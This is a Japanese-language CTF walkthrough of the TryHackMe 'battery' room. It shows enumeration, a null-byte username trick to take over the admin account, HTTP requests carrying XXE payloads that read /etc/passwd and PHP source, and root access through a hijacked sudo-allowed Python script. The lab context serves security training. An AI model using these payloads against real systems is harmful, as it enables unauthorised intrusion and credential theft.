# battery CTF

https://tryhackme.com/room/battery

## Enumeration

```shell
TARGET=10.10.106.94
sudo bash -c "echo $TARGET   battery.thm >> /etc/hosts"
```

### ポートスキャン

```shell
root@ip-10-10-237-68:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-28 07:26 BST
Nmap scan report for battery.thm (10.10.106.94)
Host is up (0.00041s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:71:D2:DE:1A:65 (Unknown)
```

```sh
root@ip-10-10-237-68:~# sudo nmap -sV -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-28 07:30 BST
Nmap scan report for battery.thm (10.10.106.94)
Host is up (0.00042s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 02:71:D2:DE:1A:65 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### サブドメイン

```shell
ffuf -u http://battery.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.battery.thm' -fs 0
```

無し

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://battery.thm -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/acc.php              (Status: 200) [Size: 1104]
/admin.php            (Status: 200) [Size: 663]
/dashboard.php        (Status: 302) [Size: 908] [--> admin.php]
/depo.php             (Status: 302) [Size: 1258] [--> admin.php]
/forms.php            (Status: 200) [Size: 2334]
/logout.php           (Status: 302) [Size: 0] [--> admin.php]
/register.php         (Status: 200) [Size: 715]
/report               (Status: 200) [Size: 16912]
/scripts              (Status: 301) [Size: 311] [--> http://battery.thm/scripts/]
/server-status        (Status: 403) [Size: 291]
/tra.php              (Status: 302) [Size: 1399] [--> admin.php]
/with.php             (Status: 302) [Size: 1259] [--> admin.php]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

register.php で登録してログイン可能。

/report を取得し、読める部分を抜粋

```
ELF>�@�:@8
          @@@@h���hhmm   00�-�=�=hp�-�=�=����DDP�tdt"t"t"TTQ�tdR�td�-�=�=▒▒/lib64/ld-linux-x86-64.so.2GNUD���h�{���t�?��N��GNU
�
Uu▒ik 92_�p�0HH@�?�?�?�?canfputs�?intfsystem__cxa_finalizestrcmp__libc_start_mainlibc.so.6GLIBC_2.7GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableKii
��admin@bank.aPassword Updated Successfully!
Sorry you can't update the password
Welcome Guest
===================Available Options==============
1. Check users2. Add user3. Delete user4. change password5. Exitclear
===============List of active users================support@bank.acontact@bank.acyber@bank.aadmins@bank.asam@bank.aadmin0@bank.asuper_user@bank.acontrol_admin@bank.ait_admin@bank.a

Welcome To ABC DEF Bank Managemet System!

UserName : %s
Password : guestYour Choice : %demail : not available for guest account
Wrong option
Wrong username or passwordP

 ▒@x��  ▒������o���o���o����o�=6FVfvH@GCC: (Debian 9.3.0-15) 9.3.0��08� 0
�

��d t"�"�=�=�=�?@▒@@P@▒��
��!07P@F�=mpy�=������,$����=��=��=�t"�@�
    `uX � ▒@@8J▒P@dQ�[Ym(�s��▒@@�� �▒H@� �]�X@��+P@�#-▒P@9 S"crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.7452__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryreport.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_finiupdate_ITM_deregisterTMCloneTableputs@@GLIBC_2.2.5_edataoptionssystem@@GLIBC_2.2.5usersprintf@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_startstrcmp@@GLIBC_2.2.5__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmain__isoc99_scanf@@GLIBC_2.7__TMC_END___ITM_registerTMCloneTable__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.got.plt.data.bss.comment�#��$6�� D��No
▒V88�^���o��k���oz00▒�B��▒��  `�����dd  �  �t"t"T��"�"������=�-��?��@�@@@P@P�0P0p0�▒    ▒7o�9
```

アクティブユーザー名

```
support@bank.a
contact@bank.a
cyber@bank.a
admins@bank.a
sam@bank.a
admin0@bank.a
super_user@bank.a
control_admin@bank.a
it_admin@bank.a
```

このユーザーリストとパスワード TOP10 リストを使って Intruder を実行したが、ログインできなかった。

/report は ELF ファイルだったので Ghidra で調べた。

`admin@bank.a` だけパスワード変更を許容するようなロジックになっている。（パスワード変更処理自体は実装されていないが）

```c
void update(char *param_1)
{
  int iVar1;

  iVar1 = strcmp(param_1,"admin@bank.a");
  if (iVar1 == 0) {
    puts("Password Updated Successfully!\n");
    options();
  }
  else {
    puts("Sorry you can\'t update the password\n");
    options();
  }
  return;
}
```

`admin@bank.a` に NULL 文字を付けてユーザー登録したら登録成功し、登録時のパスワードでログインできるようになった。

```http
POST /register.php HTTP/1.1
Host: 10.10.106.94
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: http://10.10.106.94
Connection: keep-alive
Referer: http://10.10.106.94/register.php
Cookie: PHPSESSID=92tdnga9h1tn2mdqit820e22b7
Upgrade-Insecure-Requests: 1
Priority: u=0, i

uname=admin%40bank.a%00&bank=ABC&password=12345&btn=Register+me%21
```

管理者専用の「My Account」と「Command」タブにアクセスできるようになった。

「My Account」の POST リクエスト。すぐ RCE 検出とみなされて強制ログアウトさせられる。

```http
POST /acc.php HTTP/1.1
Host: 10.10.106.94
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://10.10.106.94
Connection: keep-alive
Referer: http://10.10.106.94/acc.php
Cookie: PHPSESSID=92tdnga9h1tn2mdqit820e22b7
Upgrade-Insecure-Requests: 1
Priority: u=0, i

acno=10&msg=hello&btn=Send
```

「Command」のポストリクエストは XML。

```http
POST /forms.php HTTP/1.1
Host: 10.10.106.94
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 86
Origin: http://10.10.106.94
Connection: keep-alive
Referer: http://10.10.106.94/forms.php
Cookie: PHPSESSID=92tdnga9h1tn2mdqit820e22b7
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?><root><name>10</name><search>abc</search></root>
```

Account Number=3, Remark=2 として送信すると、

```
<?xml version="1.0" encoding="UTF-8"?><root><name>3</name><search>2</search></root>
```

画面には反映されないが、POST 応答として下記が返っている。

```
Sorry, account number 2 is not active!
```

XXE インジェクションとして Remark をターゲットにすることで、ローカルファイル表示等が可能かもしれない。

/etc/passwd を表示させる XXE インジェクション。

```http
POST /forms.php HTTP/1.1
Host: 10.10.106.94
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 139
Origin: http://10.10.106.94
Connection: keep-alive
Referer: http://10.10.106.94/forms.php
Cookie: PHPSESSID=92tdnga9h1tn2mdqit820e22b7
Priority: u=0

<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<name>3</name>
<search>&xxe;</search>
</root>
```

成功！

```http
Sorry, account number root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
cyber:x:1000:1000:cyber,,,:/home/cyber:/bin/bash
mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
yash:x:1002:1002:,,,:/home/yash:/bin/bash
 is not active!
```

cyber, yash ユーザーが存在する。これらの id_rsa は取得できなかった。

RCE の防御処理が入っていた、acc.php のソースコードを狙う。

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/acc.php" >]>
<root>
<name>3</name>
<search>&xxe;</search>
</root>
```

acc.php のソースコード取得成功。  
RCE フィルターを回避する実装でも見つからないかと考えていたが、cyber ユーザーのパスワードが入っていた。  
これを使って SSH 接続できる。

```php
<!DOCTYPE html>
<html>
<head>
<style>
form
{
  border: 2px solid black;
  outline: #4CAF50 solid 3px;
  margin: auto;
  width:180px;
  padding: 20px;
  text-align: center;
}


ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  overflow: hidden;
  background-color: #333;
}

li {
  float: left;
  border-right:1px solid #bbb;
}

li:last-child {
  border-right: none;
}

li a {
  display: block;
  color: white;
  text-align: center;
  padding: 14px 16px;
  text-decoration: none;
}

li a:hover:not(.active) {
  background-color: #111;
}

.active {
  background-color: blue;
}
</style>
</head>
<body>

<ul>
  <li><a href="dashboard.php">Dashboard</a></li>
  <li><a href="with.php">Withdraw Money</a></li>
  <li><a href="depo.php">Deposit Money</a></li>
  <li><a href="tra.php">Transfer Money</a></li>
  <li><a href="acc.php">My Account</a></li>
  <li><a href="forms.php">command</a></li>
  <li><a href="logout.php">Logout</a></li>
  <li style="float:right"><a href="contact.php">Contact Us</a></li>
</ul><br><br><br><br>

</body>
</html>

<?php

session_start();
if(isset($_SESSION['favcolor']) and $_SESSION['favcolor']==="admin@bank.a")
{

echo "<h3 style='text-align:center;'>Weclome to Account control panel</h3>";
echo "<form method='POST'>";
echo "<input type='text' placeholder='Account number' name='acno'>";
echo "<br><br><br>";
echo "<input type='text' placeholder='Message' name='msg'>";
echo "<input type='submit' value='Send' name='btn'>";
echo "</form>";
//MY CREDS :- cyber:[REDACTED]
if(isset($_POST['btn']))
{
$ms=$_POST['msg'];
echo "ms:".$ms;
if($ms==="id")
{
system($ms);
}
else if($ms==="whoami")
{
system($ms);
}
else
{
echo "<script>alert('RCE Detected!')</script>";
session_destroy();
unset($_SESSION['favcolor']);
header("Refresh: 0.1; url=index.html");
}
}
}
else
{
echo "<script>alert('Only Admins can access this page!')</script>";
session_destroy();
unset($_SESSION['favcolor']);
header("Refresh: 0.1; url=index.html");
}
?>
```

## 権限昇格１

```sh
cyber@ubuntu:~$ ls -al
total 32
drwx------ 3 cyber cyber 4096 Nov 17  2020 .
drwxr-xr-x 4 root  root  4096 Nov 16  2020 ..
-rw------- 1 cyber cyber    0 Nov 17  2020 .bash_history
-rw-r--r-- 1 cyber cyber  220 Nov  9  2020 .bash_logout
-rw-r--r-- 1 cyber cyber 3637 Nov  9  2020 .bashrc
drwx------ 2 cyber cyber 4096 Nov  9  2020 .cache
-rw--w---- 1 cyber cyber   85 Nov 15  2020 flag1.txt
-rw-r--r-- 1 cyber cyber  675 Nov  9  2020 .profile
-rwx------ 1 root  root   349 Nov 15  2020 run.py
```

特定の python ファイル実行に sudo 権限が付いている。

```sh
cyber@ubuntu:~$ sudo -l
Matching Defaults entries for cyber on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cyber may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py
```

実行したが、意味はない。

```sh
cyber@ubuntu:~$ sudo /usr/bin/python3 /home/cyber/run.py
Hey Cyber I have tested all the main components of our web server but something unusal happened from my end!
```

ディレクトリ自体が cyber ユーザーのものなので、run.py を削除して新しく作ることが可能。

```sh
cyber@ubuntu:~$ cat ./run.py
import os
os.system("/bin/bash -p")

cyber@ubuntu:~$ sudo /usr/bin/python3 /home/cyber/run.py
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```

yash のフラグも root フラグも同時に取得できた。

## 振り返り

- 一番苦労したのはログイン。`admin@bank.a` がアクティブユーザー名に含まれておらず、どれにターゲットを絞ればよいのか特定できないところが難しかった。既存ユーザーにスペースや NULL 文字を付けて上書き登録する手法自体はポピュラー。
- それ以降は Medium レベルとしては比較的簡単だったと思う。
